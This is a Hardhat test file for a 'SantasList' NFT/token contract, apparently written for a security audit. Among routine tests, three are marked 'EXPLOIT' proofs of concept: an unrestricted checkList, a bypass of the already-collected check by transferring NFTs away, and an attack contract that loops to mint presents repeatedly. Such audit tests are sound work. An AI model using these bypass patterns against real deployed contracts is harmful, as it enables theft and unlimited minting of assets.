
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";
const { deployContract, getSigners } = ethers;
import { SantaToken, SantasList, AttackContract } from '../typechain-types';
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
import { time } from "@nomicfoundation/hardhat-network-helpers";

var colors = require('colors');
colors.enable();


describe("Santas List Contract", function(){

    let santa: SignerWithAddress, deployer: signerWithAddress, user1: SignerWithAddress, user2: SignerWithAddress, user3: SignerWithAddress, user4: SignerWIthAddress, attacker: SignerWithAddress;
    
	let santasList: SantasList;
  let santatoken: SantaToken;
  let hackContract: AttackContract;

    enum Status {
      NICE,
      EXTRA_NICE,
      NAUGHTY,
      NOT_CHECKED_TWICE
  };

    before("setup", async() => {
    [deployer,santa,  user1, user2, user3, user4, attacker] = await ethers.getSigners();
  
   santasList = await deployContract('SantasList', santa); 
   /*contract size was too big had to add to hardhat.config.ts
    networks: {
        hardhat: {
          allowUnlimitedContractSize: true
        }
      },
    */
   let santaToken_contract = await santasList.connect(santa).getSantaToken();
   santatoken = await ethers.getContractAt('SantaToken',santaToken_contract);

});

    it("Checking Deployment and who is Santa", async() =>{
    ///testGetSanta()
    expect(await santasList.target).to.not.equal(0);
    expect (await santatoken.target).to.not.equal(0);
    expect (await santasList.getSanta()).to.eq(santa.address);  
    
    });

    it("Setting user1 to nice list and checking permissions Only SANTA", async() => {
      //testCheckList()
    await santasList.connect(santa).checkList(user1.address, Status.NICE);
    expect(await santasList.getNaughtyOrNiceOnce(user1.address)).to.eq(0);
    });

    it("EXPLOIT: CHECKLIST POC Anyone can add/ change the Nice List Not just SANTA".red, async() => {
      await santasList.connect(user1).checkList(user1.address, Status.NAUGHTY);
      expect(await santasList.getNaughtyOrNiceOnce(user1.address)).to.eq(2);
      await santasList.connect(user1).checkList(user2.address, Status.NICE);
      expect(await santasList.getNaughtyOrNiceOnce(user2.address)).to.eq(0);
      });


     it("CheckList twice, can not have list different then once and permissions Only Santa ".gray ,async() => {
      //testCantCheckListTwiceWithDifferentThanOnce()
      //testCheckListTwice() 
     await expect(santasList.connect(user1).checkTwice(user1, Status.NICE)).to.be.revertedWithCustomError(santasList, 'SantasList__NotSanta()');
     await santasList.connect(santa).checkTwice(user1, Status.NAUGHTY);
     await santasList.connect(santa).checkTwice(user2, Status.NICE);
     expect(await santasList.getNaughtyOrNiceTwice(user2)).to.eq(0);
     await expect(santasList.connect(santa).checkTwice(user1, Status.NICE)).to.be.revertedWithCustomError(santasList, 'SantasList__SecondCheckDoesntMatchFirst()');
     });

     it("Cannot collect presents earlier than  Xmas", async() =>{
    //testCantCollectPresentBeforeChristmas()
    await expect(santasList.connect(user2).collectPresent()).to.be.revertedWithCustomError(santasList, 'SantasList__NotChristmasYet()');

     });

     it("Collect Present - NICE LIST", async() => {
      //testCollectPresentNice()

      let xmasTime = (await santasList.CHRISTMAS_2023_BLOCK_TIME()).toString();
      await ethers.provider.send("evm_setNextBlockTimestamp", [ethers.toNumber(xmasTime)]);
       await(santasList.connect(user2).collectPresent());
      
      expect(await santasList.balanceOf(user2)).to.eq(1);
     });
      
     it("Collect Present - Cannot collect present if already collected", async() => {
      //testCantCollectPresentIfAlreadyCollected()
      await expect(santasList.connect(user2).collectPresent()).to.be.revertedWithCustomError(santasList, 'SantasList__AlreadyCollected()');  
     });

     it("EXPLOIT: Collect Present POC - BYPASS already collected and collect another".red, async() => {
       await santasList.connect(user2).transferFrom(user2.address, user3.address, 0);
       expect(await santasList.balanceOf(user3)).to.eq(1);
       await(santasList.connect(user2).collectPresent());
       expect(await santasList.balanceOf(user2)).to.eq(1);
       await santasList.connect(user2).transferFrom(user2.address, user3.address, 1);
       expect(await santasList.balanceOf(user3)).to.eq(2);
       await(santasList.connect(user2).collectPresent());
    });
    

    it("Collect Present: Cannot collect present if you are NAUGHTY", async() =>{
      
      await expect(santasList.connect(user1).collectPresent()).to.be.revertedWithCustomError(santasList, 'SantasList__NotNice()');
    });

    it("Collect Present: EXTRA NICE receive Token + NFT", async() =>{
      await santasList.connect(santa).checkList(user4.address, Status.EXTRA_NICE);
      await santasList.connect(santa).checkTwice(user4, Status.EXTRA_NICE);

      await(santasList.connect(user4).collectPresent());

      expect(await santasList.balanceOf(user4.address)).to.eq(1);
      expect(await santatoken.balanceOf(user4.address)).to.eq(ethers.toBigInt("1000000000000000000"));
      
    });

    it("Buy Present - Anyone that has SantaTokens", async() =>{
      let balance = await santatoken.balanceOf(user4.address);
      await santatoken.connect(user4).approve(santasList.target, balance);
      await santasList.connect(user4).buyPresent(user4.address);
 
    });


    it("MINT Token:  Only SantaList Contract", async() =>{
       await expect(santatoken.connect(user1).mint(user1)).to.be.revertedWithCustomError(santatoken, 'SantaToken__NotSantasList()');

    });

    it("Burn Token: Only SantaList Contract", async() =>{
      await expect(santatoken.connect(user1).burn(user1)).to.be.revertedWithCustomError(santatoken, 'SantaToken__NotSantasList()');
   });

   it("EXPLOIT:  No LIMIT POC - NFT / TOKEN MINT forever".red, async() =>{
    await santasList.connect(santa).checkList(attacker.address, Status.EXTRA_NICE);
    await santasList.connect(santa).checkTwice(attacker, Status.EXTRA_NICE);
    await santasList.connect(attacker).collectPresent();
    hackContract = await deployContract("AttackContract",[santasList.target, santatoken.target], attacker);
    let tokenID = 5;
    let maxUint256 = ethers.MaxUint256;
    
    for(let i =5; i < 100; i++){
    /// NFT TRANSFER
    await santasList.connect(attacker).transferFrom(attacker.address, hackContract.target, i);
    await santasList.connect(attacker).collectPresent();
    }
   });

});


